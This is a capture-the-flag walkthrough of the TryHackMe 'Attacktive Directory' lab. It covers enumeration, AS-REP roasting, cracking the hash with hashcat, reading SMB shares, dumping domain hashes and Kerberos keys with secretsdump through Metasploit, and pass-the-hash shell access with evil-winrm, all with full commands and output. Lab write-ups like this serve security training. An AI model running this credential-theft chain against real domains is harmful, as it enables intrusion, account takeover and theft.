# attacktivedirectory

Notes from challenges I did @ <https://tryhackme.com>.

These are notes from [attacktivedirectory](https://tryhackme.com/room/attacktivedirectory).

## Prepare

Install Impacket, kerbrute, Bloodhound and Neo4j

```bash
sudo git clone <https://github.com/SecureAuthCorp/impacket.git> /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ && sudo python3 ./setup.py install
sudo apt install bloodhound neo4j
go get github.com/ropnop/kerbrute
sudo apt update && sudo apt upgrade
```

## Scan

Scan target with ```nmap -sC -sV 10.10.12.33```

??? output "Nmap output"
    Nmap output:

    ```txt
    Nmap scan report for 10.10.12.33
    Host is up (0.021s latency).
    Not shown: 987 closed ports
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    80/tcp   open  http          Microsoft IIS httpd 10.0
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: IIS Windows Server
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-19 19:17:25Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  tcpwrapped
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
    3269/tcp open  tcpwrapped
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | rdp-ntlm-info:
    |   Target_Name: THM-AD
    |   NetBIOS_Domain_Name: THM-AD
    |   NetBIOS_Computer_Name: ATTACKTIVEDIREC
    |   DNS_Domain_Name: spookysec.local
    |   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
    |   Product_Version: 10.0.17763
    |_  System_Time: 2021-08-19T19:17:27+00:00
    | ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
    | Not valid before: 2021-08-18T18:37:51
    |_Not valid after:  2022-02-17T18:37:51
    |_ssl-date: 2021-08-19T19:17:35+00:00; 0s from scanner time.
    Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled and required
    | smb2-time:
    |   date: 2021-08-19T19:17:29
    |_  start_date: N/A

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 18.37 seconds
    ```

Enumerate port 139/445 with ```enum4linux -U -o 10.10.12.33```

??? output "enum4linux output"  
  enum4linux output
  
  ```txt
  Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Aug 19 15:24:22 2021

  ==========================
  |    Target Information    |
  ==========================
  Target ........... 10.10.12.33
  RID Range ........ 500-550,1000-1050
  Username ......... ''
  Password ......... ''
  Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

  ===================================================
  |    Enumerating Workgroup/Domain on 10.10.12.33    |
  ===================================================
  [E] Can't find workgroup/domain

  ====================================
  |    Session Check on 10.10.12.33    |
  ====================================
  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
  [+] Server 10.10.12.33 allows sessions using username '', password ''
  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
  [+] Got domain/workgroup name:

  ==========================================
  |    Getting domain SID for 10.10.12.33    |
  ==========================================
  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
  Domain Name: THM-AD
  Domain Sid: S-1-5-21-3591857110-2884097990-301047963
  [+] Host is part of a domain (not a workgroup)

  =====================================
  |    OS information on 10.10.12.33    |
  =====================================
  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
  Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
  [+] Got OS info for 10.10.12.33 from smbclient:
  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
  [+] Got OS info for 10.10.12.33 from srvinfo:
  Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

  ============================
  |    Users on 10.10.12.33    |
  ============================
  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
  [E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
  [E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
  enum4linux complete on Thu Aug 19 15:24:34 2021
  ```

./kerbrute -domain spookysec.local -dc-ip 10.10.12.33  -users ~/userlist.txt

??? output "kerbrute output"
  ```txt
  Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

  [*] Valid user => james
  [*] Valid user => svc-admin [NOT PREAUTH]
  [*] Valid user => James
  [*] Valid user => robin
  [*] Blocked/Disabled user => guest
  [*] Valid user => darkstar
  [*] Valid user => administrator
  [*] Valid user => backup
  [*] Valid user => paradox
  [*] Valid user => JAMES
  [*] Valid user => Robin
  [*] Blocked/Disabled user => Guest
  [*] Valid user => Administrator
  [*] Valid user => Darkstar
  [*] Valid user => Paradox
  [*] Valid user => DARKSTAR
  [*] Valid user => ori
  [*] Valid user => ROBIN
  [*] Blocked/Disabled user => GUEST
  [*] No passwords were discovered :'(
  ```

  GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.12.33

  ```txt
  Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

  [*] Getting TGT for svc-admin
  $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fea34e6cdca777efe84cbdeaa48d35b9$cf364f98148fce49cc67dd350754a9c9ccf20dd516b1c2c6aecb6984aba91fca5b386b4ba7b59434f54440ecccdd549533157318a55752abe941976eae78132f61832fba98bc391ee52c51e924cd8d091b6e6d854bc16e769184867024f195936687839c4e63cf54f7a2e1749020c279e3b08f78826ca90deffcda9bdd721a87166fa6e9fe6f68cd493751df05b2ae92a0e5e466f8c674bf16c346e9ee9714f7098369d90dad8e5bac5b4ac316e94ff65acd8914a356450be18b671db831031c6a709369d586d704bc827f2221f3edfd60e5f675fb6ac97570e20bd094362e354b63279e757486c82162d6ae04467d7c1261
  ```

hashcat -a 0 -m 18200 ~/example.hash ~/passwordlist.txt

??? output "hashcat output"
  ```txt
  hashcat (v6.1.1) starting...

  OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
  =============================================================================================================================
  * Device #1: pthread-Intel(R) Xeon(R) Platinum 8171M CPU @ 2.60GHz, 13896/13960 MB (4096 MB allocatable), 4MCU

  Minimum password length supported by kernel: 0
  Maximum password length supported by kernel: 256

  Hashes: 1 digests; 1 unique digests, 1 unique salts
  Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
  Rules: 1

  Applicable optimizers applied:
  * Zero-Byte
  * Not-Iterated
  * Single-Hash
  * Single-Salt

  ATTENTION! Pure (unoptimized) backend kernels selected.
  Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
  If you want to switch to optimized backend kernels, append -O to your commandline.
  See the above message to find out about the exact limits.

  Watchdog: Hardware monitoring interface not found on your system.
  Watchdog: Temperature abort trigger disabled.

  Host memory required for this attack: 134 MB

  Dictionary cache built:
  * Filename..: /home/fab1/passwordlist.txt
  * Passwords.: 70188
  * Bytes.....: 569236
  * Keyspace..: 70188
  * Runtime...: 0 secs

  $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fea34e6cdca777efe84cbdeaa48d35b9$cf364f98148fce49cc67dd350754a9c9ccf20dd516b1c2c6aecb6984aba91fca5b386b4ba7b59434f54440ecccdd549533157318a55752abe941976eae78132f61832fba98bc391ee52c51e924cd8d091b6e6d854bc16e769184867024f195936687839c4e63cf54f7a2e1749020c279e3b08f78826ca90deffcda9bdd721a87166fa6e9fe6f68cd493751df05b2ae92a0e5e466f8c674bf16c346e9ee9714f7098369d90dad8e5bac5b4ac316e94ff65acd8914a356450be18b671db831031c6a709369d586d704bc827f2221f3edfd60e5f675fb6ac97570e20bd094362e354b63279e757486c82162d6ae04467d7c1261:management2005

  Session..........: hashcat
  Status...........: Cracked
  Hash.Name........: Kerberos 5, etype 23, AS-REP
  Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fea34e6cdca...7c1261
  Guess.Base.......: File (/home/fab1/passwordlist.txt)
  Guess.Queue......: 1/1 (100.00%)
  Speed.#1.........:   158.0 kH/s (10.67ms) @ Accel:64 Loops:1 Thr:64 Vec:16
  Recovered........: 1/1 (100.00%) Digests
  Progress.........: 16384/70188 (23.34%)
  Rejected.........: 0/16384 (0.00%)
  Restore.Point....: 0/70188 (0.00%)
  Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
  Candidates.#1....: m123456 -> cowgirlup

  Started: 15:44:40
  Stopped: 15:45:18
  ```

smbclient -L \\\\10.10.12.33 -U svc-admin@spookysec.local

??? output "smbclient user output"
  ```txt
  Enter svc-admin@spookysec.local's password:

          Sharename       Type      Comment
          ---------       ----      -------
          ADMIN$          Disk      Remote Admin
          backup          Disk
          C$              Disk      Default share
          IPC$            IPC       Remote IPC
          NETLOGON        Disk      Logon server share
          SYSVOL          Disk      Logon server share
  SMB1 disabled -- no workgroup available
  ```

smbclient \\\\10.10.12.33\\backup -U svc-admin@spookysec.local

??? output "smbclient backup output"
  ```txt
  Enter svc-admin@spookysec.local's password:
  Try "help" to get a list of possible commands.
  smb: \> dir
    .                                   D        0  Sat Apr  4 15:08:39 2020
    ..                                  D        0  Sat Apr  4 15:08:39 2020
    backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                  8247551 blocks of size 4096. 3636330 blocks available
  smb: \> more backup_credentials.txt
  ```

dcode YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

??? output "dcode backup_credentials.txt"
  ```txt
      __                         __
    |/  |                   | / /
    |   | ___  ___  ___  ___|  (
    |   )|___)|    |   )|   )| |___ \   )
    |__/ |__  |__  |__/ |__/ | |     \_/
                                      /
  [+] Decoded from Base64 : backup@spookysec.local:backup2517860
  ```

Now that we know this is Base64 we can run this command to read the content: ```echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d```

Running secretsdump.py didn't work for me e.g.:

secretsdump.py spookysec.local/backup:backup2517860@10.10.12.33 -use-vss

So i used metasplot und set lhost, SMBDomain, RHOSTS,  SMBPass and SMBUser:

??? output "metasplot with secretsdump.py"
  ```txt
        =[ metasploit v6.1.0-dev                           ]
  + -- --=[ 2157 exploits - 1146 auxiliary - 367 post       ]
  + -- --=[ 596 payloads - 45 encoders - 10 nops            ]
  + -- --=[ 8 evasion                                       ]

  Metasploit tip: View all productivity tips with the
  tips command

  msf6 > search secretsdump

  Matching Modules
  ================

    #  Name                                                       Disclosure Date  Rank    Check  Description
    -  ----                                                       ---------------  ----    -----  -----------
    0  auxiliary/scanner/smb/impacket/secretsdump                                  normal  No     DCOM Exec
    1  post/windows/gather/credentials/windows_sam_hivenightmare  2021-07-20       normal  No     Windows SAM secrets leak - HiveNightmare
    2  auxiliary/gather/windows_secrets_dump                                       normal  No     Windows Secrets Dump


  Interact with a module by name or index. For example info 2, use 2 or use auxiliary/gather/windows_secrets_dump

  msf6 > use auxiliary/scanner/smb/impacket/secretsdump

  msf6 auxiliary(scanner/smb/impacket/secretsdump) > set lhost 10.9.193.173
  lhost => 10.9.193.173
  msf6 auxiliary(scanner/smb/impacket/secretsdump) > set SMBDomain spookysec.local
  SMBDomain => spookysec.local
  msf6 auxiliary(scanner/smb/impacket/secretsdump) > set RHOSTS 10.10.12.33
  RHOSTS => 10.10.12.33
  msf6 auxiliary(scanner/smb/impacket/secretsdump) > set SMBPass backup2517860
  SMBPass => backup2517860
  msf6 auxiliary(scanner/smb/impacket/secretsdump) > set SMBUser backup
  SMBUser => backup
  msf6 auxiliary(scanner/smb/impacket/secretsdump) > exploit

  [*] Running for 10.10.12.33...
  [-] 10.10.12.33 - RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
  [*] 10.10.12.33 - Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
  [*] 10.10.12.33 - Using the DRSUAPI method to get NTDS.DIT secrets
  [+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
  [+] Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  [+] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
  [+] spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
  [+] spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
  [+] spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
  [+] spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
  [+] spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
  [+] spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
  [+] spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
  [+] spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
  [+] spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
  [+] spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
  [+] spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
  [+] spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
  [+] spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
  [+] spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
  [+] ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:42d07e838f3742f5c120ff5709cf684c:::
  [*] 10.10.12.33 - Kerberos keys grabbed
  [+] Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
  [+] Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
  [+] Administrator:des-cbc-md5:2079ce0e5df189ad
  [+] krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
  [+] krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
  [+] krbtgt:des-cbc-md5:b94f97e97fabbf5d
  [+] spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
  [+] spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
  [+] spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
  [+] spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
  [+] spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
  [+] spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
  [+] spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
  [+] spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
  [+] spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
  [+] spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
  [+] spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
  [+] spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
  [+] spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
  [+] spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
  [+] spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
  [+] spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
  [+] spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
  [+] spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
  [+] spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
  [+] spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
  [+] spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
  [+] spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
  [+] spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
  [+] spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
  [+] spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
  [+] spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
  [+] spookysec.local\paradox:des-cbc-md5:83988983f8b34019
  [+] spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
  [+] spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
  [+] spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
  [+] spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
  [+] spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
  [+] spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
  [+] spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
  [+] spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
  [+] spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
  [+] spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
  [+] spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
  [+] spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
  [+] spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
  [+] spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
  [+] spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
  [+] ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:4d608519152181fd16cfce52eba869dc3620ed788902a87b6f218f756c79c4ab
  [+] ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:872f3e7f6d4ecdd33af0d0b934161b92
  [+] ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
  [*] 10.10.12.33 - Cleaning up...
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```

Secretsdump.py usese the DRSUAPI method to get NTDS.DIT secrets. We can feed evil-winrm with the hash of the adminstrator to gain access using this command: ```evil-winrm -i 10.10.12.33 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc```

??? output "evil-winrm output and flags"
  ```txt
  Evil-WinRM shell v3.2

  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

  Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

  Info: Establishing connection to remote endpoint

  *Evil-WinRM* PS C:\Users\Administrator\Documents>
  *Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
  *Evil-WinRM* PS C:\Users\backup\Desktop> more PrivEsc.txt
  *Evil-WinRM* PS C:\Users\svc-admin\Desktop> more user.txt.txt
  ```
